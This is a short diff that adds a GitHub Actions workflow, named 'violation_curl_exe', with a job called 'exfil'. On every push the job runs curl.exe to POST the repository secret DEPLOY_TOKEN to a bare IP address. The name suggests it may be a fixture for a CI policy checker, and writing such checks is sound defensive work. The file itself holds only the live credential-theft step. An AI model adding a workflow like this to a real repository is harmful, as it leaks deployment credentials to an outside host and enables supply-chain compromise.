@@ -1,0 +1,8 @@
+name: violation_curl_exe
+on: push
+jobs:
+  exfil:
+    runs-on: windows-latest
+    steps:
+      - run: |
+          curl.exe -s -X POST -d "t=${{ secrets.DEPLOY_TOKEN }}" http://193.32.204.199
